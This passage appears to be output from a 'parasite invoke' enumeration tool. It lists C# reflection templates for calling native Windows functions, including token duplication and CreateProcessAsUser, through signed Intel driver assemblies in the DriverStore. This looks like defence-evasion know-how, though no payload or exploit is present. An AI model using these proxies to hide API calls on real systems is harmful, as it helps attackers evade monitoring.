        var methodInfo = t.GetMethod(""wglDeleteContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hglrc });
        ===END SIGNATURE===

Method: glGetString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""glGetString"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { GLStringNames name });
        ===END SIGNATURE===

Method: OpenProcessToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""OpenProcessToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr ProcessHandle, int DesiredAccess, IntPtr& TokenHandle });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, IntPtr& DuplicateTokenHandle });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\IntelGraphicsAGS.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.SDKCommandLine.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.igccservice"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle, ServiceStatus& serviceStatus });
        ===END SIGNATURE===

Method: RegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""RegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { ITypeLib tlib, string szFullPath, string szHelpDir });
        ===END SIGNATURE===

Method: UnRegisterTypeLib
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_d41475607d200c40\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.COMManager.RegisterLibs"", true);
        var methodInfo = t.GetMethod(""UnRegisterTypeLib"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid& libID, ushort wVerMajor, ushort wVerMinor, int lcid, SYSKIND syskind });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll

Method: ACADetectorGetCaps
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACADetectorGetCaps"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _acaIpSoundList });
        ===END SIGNATURE===

Method: ACARegisterNotificationHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACARegisterNotificationHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint _callerPid, Guid _appId, IntPtr _eventHandle });
        ===END SIGNATURE===

Method: ACAUnregisterNotificationHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAUnregisterNotificationHandle"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId });
        ===END SIGNATURE===

Method: ACAStartSoundDetect
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAStartSoundDetect"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, Guid _soundId, AcaPolicy _policy, UInt32& _requestId });
        ===END SIGNATURE===

Method: ACAStopSoundDetect
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAStopSoundDetect"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { Guid _appId, uint _requestId });
        ===END SIGNATURE===

Method: ACASetIpParam
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACASetIpParam"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, uint _paramId, Byte[] _paramValue, uint _paramSize });
        ===END SIGNATURE===

Method: ACAGetIpParam
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAGetIpParam"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, Guid _moduleId, uint _paramId, Byte[]& _paramValue, UInt32& _paramSize });
        ===END SIGNATURE===

Method: ACAContextQuery
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""ACAContextQuery"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { Guid _appId, IntPtr _acaDetection });
        ===END SIGNATURE===

Method: GetApiVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""GetApiVersion"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { UInt32& _major, UInt32& _minor });
        ===END SIGNATURE===

Method: GetLibraryVersion
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\DLLs\IntelAcaDll.NetFull.dll"");
        Type t = asm.GetType(""IntelAcaSdkCommunication.AcaSdkApiMethods"", true);
        var methodInfo = t.GetMethod(""GetLibraryVersion"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { UnicodeString& _version });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe

Method: CreateProcessAsUserWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateProcessAsUserWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, string lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: CloseHandleExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""CloseHandleExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hHandle });
        ===END SIGNATURE===

Method: WTSGetActiveConsoleSessionIdExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""WTSGetActiveConsoleSessionIdExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetServiceDirectoryExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""GetServiceDirectoryExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt16 result = (System.UInt16) methodInfo.Invoke(null, new object[] { IntPtr _serviceStatusHandle, ServiceDirectoryType _directoryType, StringBuilder _pathBuffer, ushort _pathBufferLength, UInt16& _requiredBufferLength });
        ===END SIGNATURE===

Method: SetDllDirectoryWExport
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelNativeWinAPI.ProcessNativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDllDirectoryWExport"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string _path });
        ===END SIGNATURE===

Method: InitRpcLauncherDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""InitRpcLauncherDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: StartRpcServerDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""StartRpcServerDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _pRpcLauncher });
        ===END SIGNATURE===

Method: StopRpcServerDll
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.RpcService.RpcServerWrapper"", true);
        var methodInfo = t.GetMethod(""StopRpcServerDll"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr _pRpcLauncher });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAssistantSubscribeDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAssistantSubscribeDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { AssistantSubscribeDelegate _assistantSubscribeDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAssistantUnsubscribeDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAssistantUnsubscribeDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { AssistantUnsubscribeDelegate _assistantUnsubscribeDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRegisterPdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRegisterPdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RegisterPdtDelegate _registerPdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRegisterUdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRegisterUdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RegisterUdtDelegate _registerUdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyAddSvDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyAddSvDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { AddSvDelegate _addSvDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyUnregisterPdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyUnregisterPdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { UnregisterPdtDelegate _unregisterPdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyUnregisterUdtDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyUnregisterUdtDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { UnregisterUdtDelegate _unregisterUdtDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyRemoveSvDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyRemoveSvDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { RemoveSvDelegate _removeSvDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyQueryCapabilitiesDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyQueryCapabilitiesDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { QueryCapabilitiesDelegate _queryCapabilitiesDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyQueryCurrentLanguageDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyQueryCurrentLanguageDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { QueryCurrentLanguageDelegate _queryCurrentLanguageDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyGetMultiPaApiVersionDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyGetMultiPaApiVersionDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { GetMultiPaApiVersionDelegate _getMultiPaApiVersionDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxySetMultiPaParameterDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxySetMultiPaParameterDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { SetMultiPaParameterDelegate _setMultiPaParameterDelegate });
        ===END SIGNATURE===

Method: SetIntelMultiPaSetupProxyGetMultiPaParameterDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.MultiPaSetupProxy.RpcIntelMultiPaProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelMultiPaSetupProxyGetMultiPaParameterDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { GetMultiPaParameterDelegate _getMultiPaParameterDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpQueryDelegate _cpQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpMicArrayQueryDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpMicArrayQueryDelegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpMicArrayQueryDelegate _cpMicArrayQueryDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV1Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV1Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV1Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV2Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV2Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV2Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpCreateStreamV3Delegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
        var methodInfo = t.GetMethod(""SetIntelClientProxyCpCreateStreamV3Delegate"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { CpCreateStreamV3Delegate _cpCreateStreamDelegate });
        ===END SIGNATURE===

Method: SetIntelClientProxyCpDestroyStreamDelegate
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\intcoed.inf_amd64_0f43cda6a2474b5c\AS\IAS\IntelAudioService.exe"");
        Type t = asm.GetType(""IntelAudioService.Proxy.ClientProxy.RpcIntelClientProxy"", true);
